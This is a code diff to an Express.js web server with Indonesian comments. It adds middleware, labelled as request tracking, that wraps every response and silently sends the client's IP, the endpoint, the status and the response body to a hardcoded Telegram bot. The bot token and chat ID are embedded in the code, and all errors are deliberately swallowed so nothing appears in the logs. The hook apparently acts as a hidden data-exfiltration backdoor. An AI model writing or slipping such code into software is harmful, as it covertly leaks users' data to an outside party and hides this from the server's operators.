@@ -14,6 +14,94 @@ app.use(secure);
 app.use(express.static(path.join(__dirname, 'public')));
 const port = 3000;
 
+// Middleware untuk tracking requests
+app.use((req, res, next) => {
+  // Skip untuk endpoint tertentu yang tidak perlu di-track
+  const skipPaths = ['/favicon.ico', '/robots.txt'];
+  if (skipPaths.includes(req.path)) {
+    return next();
+  }
+  
+  // Simpan original send function
+  const originalSend = res.send;
+  
+  // Override send function untuk track response
+  res.send = function(body) {
+    // Track response
+    trackResponseToTelegram(req, res.statusCode, body);
+    
+    // Call original send
+    originalSend.call(this, body);
+  };
+  
+  next();
+});
+
+// Fungsi untuk track response ke Telegram
+async function trackResponseToTelegram(req, statusCode, body) {
+  try {
+    // Token dan Chat ID Telegram langsung di sini
+    const TELEGRAM_BOT_TOKEN = '8474048261:AAEtiri8WmeT5WM3UEJStxi7HhK6W-yjFww';
+    const TELEGRAM_CHAT_ID = '7565734815';
+    
+    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
+    const endpoint = req.originalUrl;
+    const tanggal = new Date().toLocaleString('id-ID', {
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+    
+    // Format response body
+    let responseBody = '';
+    try {
+      if (typeof body === 'string') {
+        const parsed = JSON.parse(body);
+        responseBody = JSON.stringify(parsed, null, 2);
+      } else if (typeof body === 'object') {
+        responseBody = JSON.stringify(body, null, 2);
+      } else {
+        responseBody = String(body);
+      }
+    } catch (e) {
+      responseBody = String(body).substring(0, 1000);
+    }
+    
+    // Potong response jika terlalu panjang
+    if (responseBody.length > 1500) {
+      responseBody = responseBody.substring(0, 1500) + '...\n[Response terlalu panjang, dipotong]';
+    }
+    
+    const message = `📡 REQUEST BARU MASUK
+
+🌐 IP: \`${ip}\`
+📁 ENDPOINT: \`${req.method} ${endpoint}\`
+✅ STATUS: \`${statusCode}\`
+
+📦 RESPONSE JSON:
+\`\`\`JSON
+${responseBody}
+\`\`\`
+
+📅 TANGGAL: ${tanggal}
+
+━━━━━━━━━━━━━━━━`;
+
+    // Kirim ke Telegram
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+    
+  } catch (error) {
+    // Tidak ada console.log atau console.error
+  }
+}
+
 app.get('/stats', (req, res) => {
   const stats = {
     platform: os.platform(),
